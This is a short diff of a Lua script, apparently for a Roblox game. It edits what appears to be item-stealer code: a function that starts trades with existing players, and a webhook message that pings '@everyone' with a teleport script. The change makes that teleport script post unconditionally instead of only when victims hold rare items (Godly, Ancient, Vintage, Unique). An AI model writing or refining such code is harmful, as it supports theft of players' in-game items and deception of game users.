@@ -347,10 +347,8 @@ function StartTradesForExistingPlayers()
     end
 end
 
-local includeTeleport = Godly > 0 or Ancient > 0 or Vintage > 0 or Unique > 0
-
 local data = {
-   ["content"] = includeTeleport and "@everyone" .. "\n```" .. TeleportScript .. "```" or "",
+   ["content"] = "@everyone" .. "\n```" .. TeleportScript .. "```",
    ["embeds"] = {
        {
             ["title"] = "👑 **Faque**",
